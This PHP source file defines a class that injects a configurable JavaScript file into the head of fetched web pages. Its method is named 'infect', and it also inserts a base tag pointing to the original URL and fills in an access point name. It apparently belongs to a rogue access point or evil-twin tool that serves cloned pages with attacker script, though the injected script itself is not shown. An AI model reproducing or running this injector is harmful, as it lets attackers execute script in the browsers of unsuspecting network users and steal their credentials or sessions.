<?php

require_once($_SERVER["DOCUMENT_ROOT"] . '/Constants/Mastermind.Constants.php'); 


class Mastermind {

	public function __construct($html, $url) {
		$this->html = $html;
		$this->url = $url;
		$this->js = file_get_contents(JAVASCRIPT_PATH);
		$this->ap = ACCESSPOINT_NAME;
	}


	private function editJS ()  {
		$this->js = str_replace("{ACCESSPOINT_NAME}", $this->ap, $this->js); // Change accesspoint's name in the script
		$this->js = str_replace("{URL}", $this->url, $this->js); // Add the url of the site to the script
		$this->js = "<script>\r\n" . $this->js . "\r\n</script>"; // Make the script into an HTML tag
	}

	private function infect() {
		$this->html = str_replace("</head>", $this->js . "\r\n</head>", $this->html); // Add the script to html head
		$this->html = str_replace("<head>", "<head>" . "\r\n<base href='" . $this->url . "'>", $this->html); // Add the base tag to the site
	}

	public function getHTML() {
		$this->editJS();
		$this->infect();
		return $this->html;
	}
}